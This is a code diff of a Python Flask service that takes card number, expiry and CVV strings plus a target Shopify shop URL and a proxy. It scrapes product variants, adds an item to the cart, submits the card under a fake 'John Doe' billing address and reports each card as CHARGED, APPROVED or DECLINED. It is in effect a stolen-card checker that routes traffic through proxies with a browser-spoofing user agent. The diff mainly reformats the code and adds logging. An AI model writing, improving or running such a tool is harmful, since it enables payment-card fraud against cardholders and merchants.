@@ -7,16 +7,23 @@ from urllib.parse import urljoin
 
 app = Flask(__name__)
 
+# ===== Configuration =====
 PORT = int(os.environ.get("PORT", 8099))
 TIMEOUT = 30.0
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 DEFAULT_VARIANT_ID = os.environ.get("DEFAULT_VARIANT_ID", None)
 
+# ===== Helper Functions =====
 def parse_card(card_str):
     parts = card_str.split('|')
     if len(parts) != 4:
-        raise ValueError("Invalid card format")
-    return {"number": parts[0].strip(), "month": parts[1].strip(), "year": parts[2].strip(), "cvv": parts[3].strip()}
+        raise ValueError("Invalid card format. Use number|mm|yy|cvv")
+    return {
+        "number": parts[0].strip(),
+        "month": parts[1].strip(),
+        "year": parts[2].strip(),
+        "cvv": parts[3].strip()
+    }
 
 def normalize_year(y):
     return "20" + y if len(y) == 2 else y
@@ -35,7 +42,8 @@ def get_proxy_url(proxy):
         return proxy
     parts = proxy.split('@')
     if len(parts) == 2:
-        user_pass = parts[0]; host_port = parts[1]
+        user_pass = parts[0]
+        host_port = parts[1]
         return f"http://{user_pass}@{host_port}"
     segments = proxy.split(':')
     if len(segments) == 2:
@@ -46,7 +54,7 @@ def get_proxy_url(proxy):
     else:
         return f"http://{proxy}"
 
-# ========== ULTRA AGGRESSIVE PRODUCT DETECTION ==========
+# ===== Ultra‑Aggressive Product Detection =====
 def get_candidate_variant_ids(client, shop_url, provided_variant_id=None):
     candidates = set()
     if provided_variant_id:
@@ -59,7 +67,7 @@ def get_candidate_variant_ids(client, shop_url, provided_variant_id=None):
         resp = client.get(shop_url)
         if resp.status_code == 200:
             html = resp.text
-            # Look for product handle in /products/ URLs
+            # Extract product handles from /products/ links
             matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', html)
             for handle in matches:
                 prod_url = urljoin(shop_url, f"/products/{handle}.js")
@@ -67,7 +75,7 @@ def get_candidate_variant_ids(client, shop_url, provided_variant_id=None):
                 if vresp.status_code == 200:
                     for variant in vresp.json().get("variants", []):
                         candidates.add(str(variant["id"]))
-            # Look for JSON-LD structured data
+            # Look for JSON‑LD structured data
             json_ld = re.findall(r'<script type="application/ld\+json">(.*?)</script>', html, re.DOTALL)
             for block in json_ld:
                 try:
@@ -84,7 +92,7 @@ def get_candidate_variant_ids(client, shop_url, provided_variant_id=None):
                                     candidates.add(str(offer["sku"]))
                 except:
                     pass
-            # Look in script tags for 'variantId' or 'productId'
+            # Look for variantId in JavaScript objects
             script_data = re.findall(r'variantId["\']?\s*:\s*["\']?(\d+)', html)
             candidates.update(script_data)
             script_data2 = re.findall(r'product["\']?\s*:\s*{\s*"id["\']?\s*:\s*(\d+)', html)
@@ -132,11 +140,12 @@ def get_candidate_variant_ids(client, shop_url, provided_variant_id=None):
             if vresp.status_code == 200:
                 for variant in vresp.json().get("variants", []):
                     candidates.add(str(variant["id"]))
-        except:
+        except Exception as e:
             continue
 
-    # 5. Ultimate fallback: try variant ID 1
+    # 5. Ultimate fallback
     candidates.add("1")
+
     candidates = {c for c in candidates if c}
     return list(candidates)
 
@@ -152,38 +161,52 @@ def try_add_to_cart(client, shop_url, variant_id):
                 if "items" in cart_data and cart_data["items"]:
                     return cart_data
         except Exception as e:
-            app.logger.warning(f"Add to cart attempt failed: {e}")
+            app.logger.warning(f"Add to cart attempt failed for {variant_id}: {e}")
     return None
 
 # ===== Core Checkout =====
 def perform_checkout(card_data, shop_url, proxy, variant_id=None):
     proxy_url = get_proxy_url(proxy)
+    app.logger.info(f"Using proxy: {proxy_url if proxy_url else 'None'}")
     with httpx.Client(
         timeout=TIMEOUT,
         follow_redirects=True,
-        headers={"User-Agent": USER_AGENT, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json"},
+        headers={
+            "User-Agent": USER_AGENT,
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+        },
         proxies=proxy_url
     ) as client:
         candidates = get_candidate_variant_ids(client, shop_url, variant_id)
         app.logger.info(f"Candidates: {candidates}")
+
         cart_data = None
         for vid in candidates:
             cart_data = try_add_to_cart(client, shop_url, vid)
             if cart_data:
                 app.logger.info(f"Successful variant: {vid}")
                 break
+
         if not cart_data:
             return {"status": "ERROR", "message": "No valid product found", "retryable": True}
+
         checkout_token = cart_data.get("items", [{}])[0].get("checkout_token")
         if not checkout_token:
             return {"status": "ERROR", "message": "No checkout token", "retryable": True}
 
-        # Billing address
+        # Set billing address
         billing = {
             "billing_address": {
-                "first_name": "John", "last_name": "Doe", "address1": "123 Main St",
-                "city": "New York", "province": "NY", "zip": "10001", "country": "US",
-                "phone": "2125555555", "company": ""
+                "first_name": "John",
+                "last_name": "Doe",
+                "address1": "123 Main St",
+                "city": "New York",
+                "province": "NY",
+                "zip": "10001",
+                "country": "US",
+                "phone": "2125555555",
+                "company": ""
             }
         }
         bill_url = f"{shop_url}/checkout/{checkout_token}/billing_address.json"
@@ -192,9 +215,10 @@ def perform_checkout(card_data, shop_url, proxy, variant_id=None):
             if resp.status_code not in (200, 201):
                 return {"status": "ERROR", "message": "Failed to set billing address", "retryable": True}
         except Exception as e:
+            app.logger.error(f"Billing address error: {e}")
             return {"status": "ERROR", "message": f"Billing error: {e}", "retryable": True}
 
-        # Payment
+        # Submit payment
         payment_payload = {
             "payment": {
                 "credit_card": {
@@ -202,7 +226,8 @@ def perform_checkout(card_data, shop_url, proxy, variant_id=None):
                     "month": card_data["month"],
                     "year": normalize_year(card_data["year"]),
                     "verification_value": card_data["cvv"],
-                    "first_name": "John", "last_name": "Doe"
+                    "first_name": "John",
+                    "last_name": "Doe"
                 },
                 "billing_address": billing["billing_address"]
             }
@@ -214,9 +239,23 @@ def perform_checkout(card_data, shop_url, proxy, variant_id=None):
                 result = resp.json()
                 status = result.get("status")
                 if status == "completed":
-                    return {"status": "CHARGED", "message": "Payment captured", "amount": result.get("amount", "0.00"), "gateway": "Shopify Payments", "receipt_url": result.get("receipt_url", ""), "retryable": False}
+                    return {
+                        "status": "CHARGED",
+                        "message": "Payment captured",
+                        "amount": result.get("amount", "0.00"),
+                        "gateway": "Shopify Payments",
+                        "receipt_url": result.get("receipt_url", ""),
+                        "retryable": False
+                    }
                 elif status == "authorized":
-                    return {"status": "APPROVED", "message": "Auth approved", "amount": result.get("amount", "0.00"), "gateway": "Shopify Payments", "receipt_url": "", "retryable": False}
+                    return {
+                        "status": "APPROVED",
+                        "message": "Auth approved",
+                        "amount": result.get("amount", "0.00"),
+                        "gateway": "Shopify Payments",
+                        "receipt_url": "",
+                        "retryable": False
+                    }
                 else:
                     msg = result.get("message", "Unknown decline")
                     if "insufficient" in msg.lower():
@@ -229,33 +268,43 @@ def perform_checkout(card_data, shop_url, proxy, variant_id=None):
                 text = resp.text.lower()
                 if "3d" in text or "3d_secure" in text:
                     return {"status": "DECLINED", "message": "3DS required", "retryable": False}
-                return {"status": "DECLINED", "message": f"Payment failed (HTTP {resp.status_code})", "retryable": False}
+                return {
+                    "status": "DECLINED",
+                    "message": f"Payment failed (HTTP {resp.status_code})",
+                    "retryable": False
+                }
         except httpx.TimeoutException:
             return {"status": "ERROR", "message": "Payment timeout", "retryable": True}
         except Exception as e:
             app.logger.error(f"Payment exception: {e}")
             return {"status": "ERROR", "message": f"Payment error: {e}", "retryable": True}
 
-# ===== Routes =====
+# ===== Flask Routes =====
 @app.route('/shopify', methods=['POST'])
 def shopify():
     data = request.get_json()
     if not data:
-        return jsonify({"status": "ERROR", "message": "Missing JSON"}), 400
+        return jsonify({"status": "ERROR", "message": "Missing JSON body"}), 400
+
     card_str = data.get('card')
     shop_url = data.get('shop_url')
     proxy = data.get('proxy', '')
-    variant_id = data.get('variant_id')
+    variant_id = data.get('variant_id', None)
+
     if not card_str or not shop_url:
         return jsonify({"status": "ERROR", "message": "Missing card or shop_url"}), 400
+
     try:
         card = parse_card(card_str)
         shop_url = parse_shop_url(shop_url)
         result = perform_checkout(card, shop_url, proxy, variant_id)
         return jsonify(result)
+    except ValueError as e:
+        app.logger.error(f"Card parse error: {e}")
+        return jsonify({"status": "ERROR", "message": str(e), "retryable": False}), 400
     except Exception as e:
         app.logger.error(f"Unhandled error: {e}")
-        return jsonify({"status": "ERROR", "message": str(e), "retryable": True}), 500
+        return jsonify({"status": "ERROR", "message": f"Internal error: {e}", "retryable": True}), 500
 
 @app.route('/health', methods=['GET'])
 def health():
